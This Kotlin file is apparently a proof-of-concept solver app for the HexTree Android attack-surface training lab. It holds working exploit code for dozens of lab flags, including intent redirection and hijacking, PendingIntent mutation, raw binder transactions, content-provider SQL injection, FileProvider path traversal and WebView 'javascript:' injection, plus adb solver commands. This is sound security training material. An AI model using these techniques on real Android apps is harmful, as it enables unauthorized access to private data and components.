package com.example.hextreesolver

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.ElevatedCard
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.animation.animateContentSize
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.hextreesolver.ui.theme.HexTreeSolverTheme

import android.app.PendingIntent
import android.content.Intent
import android.content.ComponentName
import androidx.compose.ui.platform.LocalContext
import android.net.Uri
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat

// this is a POC app to hextree intent attacks apk
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Process intent if app is opened directly via system chooser / implicit intent
        handleIncomingIntent(intent)

        setContent {
            HexTreeSolverTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    MainContent(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent) // Ensures getIntent() stays updated

        // Process intent if app was already running in background/foreground
        handleIncomingIntent(intent)
    }

    // Shared handler for Flag 22, 23, and future callback flags
    private fun handleIncomingIntent(intent: Intent?) {
        if (intent == null) return

        // --- FLAG 23 MUTATION LOGIC ---
        if (intent.action == "io.hextree.attacksurface.MUTATE_ME") {
            val pendingIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("pending_intent", PendingIntent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("pending_intent") as? PendingIntent
            }

            if (pendingIntent != null) {
                // Attach the required "code" extra set to 42
                val fillInIntent = Intent().apply {
                    putExtra("code", 42)
                }

                try {
                    // Mutate and send back to Flag23Activity
                    pendingIntent.send(this, 0, fillInIntent)
                    Log.d("FLAG23", "Boom! PendingIntent mutated and sent back successfully.")
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        // --- FLAG CAPTURE LOGIC (FLAG 22 & OTHERS) ---
        if (intent.hasExtra("flag")) {
            val stolenFlag = intent.getStringExtra("flag")

            // 1. Print it to Logcat so you can copy/paste it
            Log.d("STOLEN_FLAG", "BOOM! Got Flag: $stolenFlag")

            // 2. Pop it up on your device screen as a Toast notification
            Toast.makeText(this, "Flag: $stolenFlag", Toast.LENGTH_LONG).show()
        }
        if (intent.action == "io.hextree.FLAG33") {
            try {
                val uri = intent.data ?: return

                // We securely possess read access to the hidden provider!
                // Execute the SQL Injection via the projection parameter
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("'flag33'"), // Translates to: SELECT 'flag33' FROM flags
                    null, null, null
                )

                cursor?.close()
                Log.d("FLAG33.2", "Intercepted intent and fired SQLi!")

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}


@Composable
fun MainContent(modifier: Modifier = Modifier) {
    Column(modifier = modifier.fillMaxSize()) {
        HeaderSection()
        ButtonList()
    }
}

@Composable
fun HeaderSection() {
    Surface(
        modifier = Modifier.fillMaxWidth(),
        color = MaterialTheme.colorScheme.primary,
        shadowElevation = 8.dp
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(top = 40.dp, bottom = 24.dp, start = 24.dp, end = 24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "This is Gohary's POC\nfor hextree app\n\nMake sure you have hextree app installed before trying",
                style = MaterialTheme.typography.titleLarge.copy(
                    fontWeight = FontWeight.ExtraBold,
                    lineHeight = 28.sp
                ),
                color = MaterialTheme.colorScheme.onPrimary,
                textAlign = TextAlign.Center
            )
        }
    }
}

@Composable
fun FlagItem(id: Any, explanation: String, onButtonClick: () -> Unit) {
    var isToggled by remember { mutableStateOf(false) }
    
    ElevatedCard(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp)
            .animateContentSize(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.elevatedCardColors(
            containerColor = MaterialTheme.colorScheme.surface
        )
    ) {
        Column(
            modifier = Modifier
                .padding(12.dp)
                .fillMaxWidth()
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    text = "Toggle to show flag $id Explanation",
                    style = MaterialTheme.typography.labelLarge.copy(fontWeight = FontWeight.Medium),
                    modifier = Modifier.weight(1f)
                )
                Switch(
                    checked = isToggled,
                    onCheckedChange = { isToggled = it }
                )
            }
            
            if (isToggled) {
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = explanation,
                    style = MaterialTheme.typography.bodyMedium.copy(
                        fontWeight = FontWeight.SemiBold,
                        color = MaterialTheme.colorScheme.secondary
                    ),
                    modifier = Modifier.padding(bottom = 8.dp)
                )
            }
            
            Button(
                onClick = onButtonClick,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text("flag$id")
            }
        }
    }
}

@Composable
fun ButtonList() {
    val context = LocalContext.current
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        item {
            FlagItem( id = 1,
                explanation = "The Problem Here that the Activity is exported, any app can call it with an intent and launch it"
            ) {
                try {
                    val intent = Intent().apply {
                        component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity")
                    }
                    context.startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
        item { FlagItem(2, "Same, Exported Activity, but this time it needed an action in the intent to reveal the flag") {
            try {
                val intent = Intent().apply {
                    action = "io.hextree.action.GIVE_FLAG"
                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity")
                }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(3, "Same, Exported Activity, but this time it needed an action and a data URI in the intent to reveal the flag") {
            try {
                val intent = Intent().apply {
                    action = "io.hextree.action.GIVE_FLAG"
                    data = Uri.parse("https://app.hextree.io/map/android")
                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity")
                }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item {
            var exploitStep by remember { mutableStateOf(1) }
            FlagItem(4, "State Machine Attack: Requires a 4-step sequence of specific intent actions without breaking the chain.\\n\\nNext Step to click: 4 times") {
                try {
                    val intent = Intent().apply {
                        action = when (exploitStep) {
                            1 -> "PREPARE_ACTION"
                            2 -> "BUILD_ACTION"
                            3 -> "GET_FLAG_ACTION"
                            else -> "ANY_FINAL_ACTION"
                        }
                        component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity")
                    }
                    context.startActivity(intent)
                    exploitStep = if (exploitStep < 4) exploitStep + 1 else 1
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
        item { FlagItem(5, "Exported activity that needsIntent-in-Intent redirection: We must wrap a second intent inside the first nested intent to hit the 'success' condition.") {
            try {
                val nestedIntent2 = Intent().apply { putExtra("reason", "back") }
                val nestedIntent1 = Intent().apply { putExtra("return", 42); putExtra("nextIntent", nestedIntent2) }
                val outerIntent = Intent().apply {
                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity")
                    putExtra("android.intent.extra.INTENT", nestedIntent1)
                }
                context.startActivity(outerIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(6, "This activity is not exported, but a misconfig in flag5 (Intent Redirection) allows accessing it via activity flag 5") {
            try {
                val nestedIntent2 = Intent().apply {
                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity")
                    putExtra("reason", "next")
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }
                val nestedIntent1 = Intent().apply { putExtra("return", 42); putExtra("nextIntent", nestedIntent2) }
                val outerIntent = Intent().apply {
                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity")
                    putExtra("android.intent.extra.INTENT", nestedIntent1)
                }
                context.startActivity(outerIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(7, "Activity Lifecycle Trick: Requires sending 'OPEN' to instantiate the activity via onCreate, followed immediately by 'REOPEN' to deliver a payload into onNewIntent.") {
            try {
                val openIntent = Intent().apply { action = "OPEN"; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
                val reopenIntent = Intent().apply { action = "REOPEN"; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"); addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK) }
                context.startActivity(openIntent)
                context.startActivity(reopenIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(8, "Exploits ActivityResult validation, it checks if the class that sent the intent has 'HexTree' in it via call back intent, done by creating a class 'HextreeCallbackActivity' that bypass the filter and sending the ") {
            try { context.startActivity(Intent(context, HextreeFlag8and9Activity::class.java)) } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(9, "Launches Flag 9 via proxy to bypass origin verification, then listens for the returned intent data callback channel to capture the explicit flag string.") {
            try { context.startActivity(Intent(context, HextreeFlag8and9Activity::class.java).apply { putExtra("target_flag", 9) }) } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(10, "Intent Hijacking: Registers an intent filter for 'ATTACK_ME' action to catch the outgoing broadcast intent launched by the target application.To Exploit open the victim app click on the flag 10 to trigger the implicit intent") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag10Activity") }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(11, "Implicit Intent Handshake: Intercepts 'ATTACK_ME' action and uses setResult() to deliver back the required validation token (1094795585).To Exploit open the victim app click on the flag 10 to trigger the implicit intent.") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag11Activity") }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(12, "Conditional Implicit Interception: We must pass a 'LOGIN' boolean extra to Flag12ruption during initiation so it bypasses the return guard statement when receiving our token This flag activity is exported so press the button it will open the activity, no need to visit the app itself.") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"); putExtra("LOGIN", true) }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(13, "Deeplink Exploitation: Constructs an intent matching the target's isDeeplink verification check (VIEW action, BROWSABLE category, application_id extra) pointing to 'hex://flag?action=give-me'.") {
            try {
                val intent = Intent().apply { action = Intent.ACTION_VIEW; addCategory(Intent.CATEGORY_BROWSABLE); data = Uri.parse("hex://flag?action=give-me"); putExtra("com.android.browser.application_id", "com.android.browser"); component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag13Activity") }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(14, "Deep Link Hijacking: Registers our own activity for scheme 'hex://token' (same as Flag14Activity's intent-filter) to intercept the login redirect. Clicking this button starts the target's login flow (no action -> generates authChallenge and opens the browser). When the mock server redirects back to hex://token?..., our HijackFlag14Activity should be offered/chosen instead of (or alongside) the real one, letting us rewrite type=user -> type=admin before forwarding to the real Flag14Activity.") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity") }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(15, "Deeplink validation bypass: Must satisfy isDeeplink() [BROWSABLE category + browser app_id extra] with action 'io.hextree.action.GIVE_FLAG', plus extras action='flag' and flag=true.") {
            try {
                val intent = Intent().apply { action = "io.hextree.action.GIVE_FLAG"; addCategory(Intent.CATEGORY_BROWSABLE); component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag15Activity"); putExtra("com.android.browser.application_id", "com.android.browser"); putExtra("action", "flag"); putExtra("flag", true) }
                context.startActivity(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(16, "Exported Broadcast Receiver: Triggers the receiver by sending an explicit broadcast intent. The extra key must be lowercase 'flag' to match the receiver's extraction logic.") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver"); putExtra("flag", "give-flag-16") }
                context.sendBroadcast(intent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(17, "Ordered Broadcast: The target receiver verifies isOrderedBroadcast() and returns the flag data via setResult(). We must use sendOrderedBroadcast() and supply a local resultReceiver to catch the callback Bundle.") {
            try {
                val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver"); putExtra("flag", "give-flag-17") }
                val resultReceiver = object : android.content.BroadcastReceiver() {
                    override fun onReceive(ctx: android.content.Context, intent: Intent?) {
                        val results = getResultExtras(true)
                        if (results.getBoolean("success", false)) {
                            val flag = results.getString("flag")
                            Log.d("FLAG17", "BOOM! Got Flag: $flag")
                            Toast.makeText(ctx, "Flag 17: $flag", Toast.LENGTH_LONG).show()
                        }
                    }
                }
                context.sendOrderedBroadcast(intent, null, resultReceiver, null, android.app.Activity.RESULT_OK, null, null)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(18, "Broadcast Interception: Registers a receiver dynamically on the Application Context, then opens the Hextree app. You must manually click 'Flag 18' in the Hextree app to trigger the broadcast!") {
            try {
                val appContext = context.applicationContext
                val receiver = object : android.content.BroadcastReceiver() {
                    override fun onReceive(ctx: android.content.Context, intent: Intent) {
                        val flag = intent.getStringExtra("flag")
                        Toast.makeText(ctx, "Got Flag 18: $flag", Toast.LENGTH_LONG).show()
                        resultCode = android.app.Activity.RESULT_OK
                        ctx.unregisterReceiver(this)
                    }
                }
                val filter = android.content.IntentFilter("io.hextree.broadcast.FREE_FLAG")
                ContextCompat.registerReceiver(appContext, receiver, filter, ContextCompat.RECEIVER_EXPORTED)
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(19, "Widget Provider: App widgets are Broadcast Receivers. The system blocks spoofing the exact widget update action, but the target uses .contains(), so we can bypass it using a custom action string.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val intent = Intent().apply {
                        component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget")
                        action = "APPWIDGET_UPDATE"
                        val optionsBundle = Bundle().apply { putInt("appWidgetMaxHeight", 1094795585); putInt("appWidgetMinHeight", 322376503) }
                        putExtra("appWidgetOptions", optionsBundle)
                    }
                    context.sendBroadcast(intent)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(20, "Dynamic Receiver Targeting: The receiver is not in the manifest, so ComponentName fails. We must target it by Action while injecting the 'give-flag'=true extra. Click this, then IMMEDIATELY switch back to the open Flag 20 screen in HexTree!") {
            try {
                Toast.makeText(context, "⏳ Switch to HexTree NOW!", Toast.LENGTH_LONG).show()
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val intent = Intent().apply { action = "io.hextree.broadcast.GET_FLAG"; setPackage("io.hextree.attacksurface"); putExtra("give-flag", true) }
                    context.sendBroadcast(intent)
                }, 3500)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(21, "Notification Hijacking: The notification's button broadcasts an implicit intent containing the flag in its extras. We register a global receiver to listen for that action and steal the flag when the notification button is pressed.") {
            try {
                val appContext = context.applicationContext
                val receiver = object : android.content.BroadcastReceiver() {
                    override fun onReceive(ctx: android.content.Context, intent: Intent) {
                        val flag = intent.getStringExtra("flag")
                        Toast.makeText(ctx, "Got Flag 21: $flag", Toast.LENGTH_LONG).show()
                        ctx.unregisterReceiver(this)
                    }
                }
                val filter = android.content.IntentFilter("io.hextree.broadcast.GIVE_FLAG")
                ContextCompat.registerReceiver(appContext, receiver, filter, ContextCompat.RECEIVER_EXPORTED)
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(22, "PendingIntent Hijacking (Activity Variant): Deliver a mutable PendingIntent targeting our MainActivity. Flag22Activity populates it with the flag extra and sends it back to our onNewIntent handler.") {
            try {
                val callbackIntent = Intent(context, MainActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP) }
                val pendingIntentFlags = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
                val mutablePendingIntent = PendingIntent.getActivity(context, 2222, callbackIntent, pendingIntentFlags)
                val targetIntent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"); putExtra("PENDING", mutablePendingIntent) }
                context.startActivity(targetIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(23, "PendingIntent Hijacking: Launches target app. Open Flag 23 in target app to trigger 'MUTATE_ME' broadcast.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(24, "Exported Service: Starts Flag24Service via its exported intent-filter action On Android 11+, the victim app must be in foreground for the activity to launch from a service. can also be easily done by adb command adb shell am start-service -a io.hextree.services.START_FLAG24_SERVICE -n io.hextree.attacksurface/.services.Flag24Service\n") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val svcIntent = Intent().apply { action = "io.hextree.services.START_FLAG24_SERVICE"; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service") }
                    context.startService(svcIntent)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(25, "Multi-Stage Service Unlock: Sends three sequential startService calls with UNLOCK1, UNLOCK2, UNLOCK3 to Flag25Service.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    listOf("io.hextree.services.UNLOCK1", "io.hextree.services.UNLOCK2", "io.hextree.services.UNLOCK3").forEach { act ->
                        context.startService(Intent().apply { action = act; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service") })
                    }
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(26, "Bound Service / Messenger IPC: Binds to Flag26Service, wraps the returned IBinder into a Messenger, and sends a Message with 'what' = 42.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val connection = object : android.content.ServiceConnection {
                        override fun onServiceConnected(cn: ComponentName, svc: android.os.IBinder) {
                            android.os.Messenger(svc).send(android.os.Message.obtain(null, 42)); context.unbindService(this)
                        }
                        override fun onServiceDisconnected(cn: ComponentName) {}
                    }
                    context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(27, "Bidirectional IPC: Requires setting up a local Messenger to catch a reply, sending 'give flag', requesting a password, and finally sending the password back with a replyTo attached to prevent a NullPointerException in the target service.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val connection = object : android.content.ServiceConnection {
                        override fun onServiceConnected(cn: ComponentName, svc: android.os.IBinder) {
                            val thisConnection = this
                            val remote = android.os.Messenger(svc)
                            val h = object : android.os.Handler(android.os.Looper.getMainLooper()) {
                                override fun handleMessage(m: android.os.Message) {
                                    if (m.what == 2) {
                                        val p = m.data.getString("password")
                                        if (p != null) {
                                            val m3 = android.os.Message.obtain(null, 3); m3.data = Bundle().apply { putString("password", p) }; m3.replyTo = android.os.Messenger(this)
                                            remote.send(m3); android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ context.unbindService(thisConnection) }, 500)
                                        }
                                    }
                                }
                            }
                            val local = android.os.Messenger(h)
                            remote.send(android.os.Message.obtain(null, 1).apply { data = Bundle().apply { putString("echo", "give flag") }; replyTo = local })
                            remote.send(android.os.Message.obtain(null, 2).apply { replyTo = local; obj = Bundle() })
                        }
                        override fun onServiceDisconnected(cn: ComponentName) {}
                    }
                    context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(28, "AIDL Interface: The target uses a custom AIDL (IFlag28Interface). Instead of reconstructing the .aidl file in our project, we can exploit it directly by sending a raw binder transaction (code 1) with the correct Interface Token to trigger openFlag().") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val connection = object : android.content.ServiceConnection {
                        override fun onServiceConnected(cn: ComponentName, b: android.os.IBinder) {
                            val d = android.os.Parcel.obtain(); val r = android.os.Parcel.obtain(); d.writeInterfaceToken("io.hextree.attacksurface.services.IFlag28Interface")
                            b.transact(android.os.IBinder.FIRST_CALL_TRANSACTION, d, r, 0); r.readException(); d.recycle(); r.recycle(); context.unbindService(this)
                        }
                        override fun onServiceDisconnected(cn: ComponentName) {}
                    }
                    context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(29, "Multi-Stage AIDL: Executes a chain of three raw binder transactions. 1) Calls init() to retrieve a password, 2) Calls authenticate() passing that password, 3) Calls success() to trigger the flag.") {
            try {
                val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                if (launchIntent != null) context.startActivity(launchIntent)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val connection = object : android.content.ServiceConnection {
                        override fun onServiceConnected(cn: ComponentName, b: android.os.IBinder) {
                            val desc = "io.hextree.attacksurface.services.IFlag29Interface"
                            var d = android.os.Parcel.obtain(); var r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); b.transact(1, d, r, 0); r.readException(); val p = r.readString(); d.recycle(); r.recycle()
                            if (p != null) { d = android.os.Parcel.obtain(); r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); d.writeString(p); b.transact(2, d, r, 0); r.readException(); d.recycle(); r.recycle()
                                d = android.os.Parcel.obtain(); r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); b.transact(3, d, r, 0); r.readException(); d.recycle(); r.recycle() }
                            context.unbindService(this)
                        }
                        override fun onServiceDisconnected(cn: ComponentName) {}
                    }
                    context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                }, 800)
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(30, "Content Provider Exploitation: Using the known authority from the manifest, we directly query the '/success' path to trigger the provider's internal Activity launch logic.\n\nADB Solver:\nadb shell content query --uri content://io.hextree.flag30/success") {
            try { context.contentResolver.query(Uri.parse("content://io.hextree.flag30/success"), null, null, null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(31, "Content Provider UriMatcher: The provider uses a UriMatcher expecting the pattern 'flag/#'. When we pass '31' as the appended ID, it triggers the success() method.\n\nADB Solver:\nadb shell content query --uri content://io.hextree.flag31/flag/31") {
            try { context.contentResolver.query(Uri.parse("content://io.hextree.flag31/flag/31"), null, null, null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(32, "Content Provider SQL Injection: The provider unsafely concatenates the selection string into the WHERE clause. By injecting '1) OR 1=1 OR (1', we bypass the visibility check and dump the whole table, ensuring flag32 is found in the cursor.\n\nADB Solver:\nadb shell content query --uri content://io.hextree.flag32/flags --where \"1) OR 1=1 OR (1\"") {
            try { context.contentResolver.query(Uri.parse("content://io.hextree.flag32/flags"), null, "1) OR 1=1 OR (1", null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
        item {
            FlagItem(
                id = "33.1",
                explanation = "URI Permission Leak + SQLi + Lifecycle: We call startActivityForResult() to silently steal URI read access to the hidden provider. We then bring HexTree back to the foreground so the Android OS doesn't block the provider from launching the flag activity when our injected SQL payload succeeds."
            ) {
                try {
                    var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                    (act as? android.app.Activity)?.let { a ->
                        a.startActivityForResult(Intent("io.hextree.FLAG33").apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1") }, 33)
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            val li = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (li != null) context.startActivity(li)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                a.contentResolver.query(Uri.parse("content://io.hextree.flag33_1/flags"), arrayOf("'flag33'"), null, null, null)?.close()
                            }, 500)
                        }, 1200)
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
        item {
            FlagItem(
                id = "33.2",
                explanation = "Implicit Intent Permission Leak: Flag33Activity2 calls startActivity() with an implicit intent containing the URI permission. Our Manifest catches it, and our MainActivity fires the projection SQL injection using the newly granted access."
            ) {
                try {
                    val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity2") }
                    context.startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
        item { FlagItem(34, "Empty Action as requested.") { /* Button 34 Action is empty */ } }
        item { FlagItem(35, "Root-FileProvider Traversal: Request '../flag35.txt'.") {
            try {
                var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag35ExploitFragment(), "f35")?.commit()
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(36, "Cross-Activity FileProvider Abuse: Overwrite shared_prefs.") {
            try {
                var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag36ExploitFragment(), "f36")?.commit()
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(37, "flag37 text") { /* Button 37 Action */ } }
        item { FlagItem(38, "WebView JavaScript Interface: The Activity loads an attacker-controlled URL and exposes a JavaScript Interface named 'hextree'. By providing a 'javascript:' URI, we can execute XSS to call the exposed Java method 'hextree.success(true)' and pop the flag.\n\nADB Solver:\nadb shell am start -n io.hextree.attacksurface/.webviews.Flag38WebViewsActivity --es URL \"javascript:hextree.success(true)\"") {
            try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"); putExtra("URL", "javascript:hextree.success(true)") }) } catch (e: Exception) { e.printStackTrace() } } }
